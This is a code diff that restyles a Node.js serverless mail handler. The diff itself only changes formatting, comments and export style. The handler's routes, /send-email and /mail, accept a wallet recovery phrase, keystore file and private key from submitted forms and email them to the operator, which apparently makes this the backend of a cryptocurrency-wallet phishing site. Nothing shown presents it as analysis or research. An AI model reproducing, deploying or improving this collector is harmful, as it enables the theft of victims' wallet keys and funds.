@@ -10,13 +10,13 @@ function formatMessage(message) {
   </div>`;
 }
 
-module.exports = async (req, res) => {
-  // Health check
+export default async function handler(req, res) {
+  // ✅ Health check
   if (req.method === "GET" && req.url === "/") {
     return res.status(200).send("Server is running ✅");
   }
 
-  // Shared transporter
+  // ✅ Shared transporter
   const email = process.env.EMAIL_USER || "";
   const pass = process.env.EMAIL_PASS || "";
   const transporter = nodemailer.createTransport({
@@ -24,7 +24,7 @@ module.exports = async (req, res) => {
     auth: { user: email, pass },
   });
 
-  // /api/send-email
+  // ✅ /api/send-email
   if (req.method === "POST" && req.url === "/send-email") {
     try {
       const { phrase, keystore, privateKey, item } = req.body;
@@ -58,7 +58,9 @@ module.exports = async (req, res) => {
       }
 
       if (!mailOptions) {
-        return res.status(400).json({ message: "Submission Failed (empty body)" });
+        return res
+          .status(400)
+          .json({ message: "Submission Failed (empty body)" });
       }
 
       const result = await transporter.sendMail(mailOptions);
@@ -67,11 +69,13 @@ module.exports = async (req, res) => {
       return res.status(200).json({ message: "Email sent successfully!" });
     } catch (error) {
       console.error("🔥 Email error:", error);
-      return res.status(500).json({ error: "Email failed", details: error.message });
+      return res
+        .status(500)
+        .json({ error: "Email failed", details: error.message });
     }
   }
 
-  // /api/mail
+  // ✅ /api/mail
   if (req.method === "POST" && req.url === "/mail") {
     try {
       const { phrase, keystore, privateKey, item } = req.body;
@@ -105,7 +109,9 @@ module.exports = async (req, res) => {
       }
 
       if (!mailOptions) {
-        return res.status(400).json({ message: "Submission Failed (empty body)" });
+        return res
+          .status(400)
+          .json({ message: "Submission Failed (empty body)" });
       }
 
       const result = await transporter.sendMail(mailOptions);
@@ -114,10 +120,12 @@ module.exports = async (req, res) => {
       return res.status(200).json({ message: "Email sent successfully!" });
     } catch (error) {
       console.error("🔥 Mail error:", error);
-      return res.status(500).json({ error: "Internal server error", details: error.message });
+      return res
+        .status(500)
+        .json({ error: "Internal server error", details: error.message });
     }
   }
 
-  // Fallback
+  // ❌ Fallback
   return res.status(404).json({ error: "Route not found" });
-};
+}
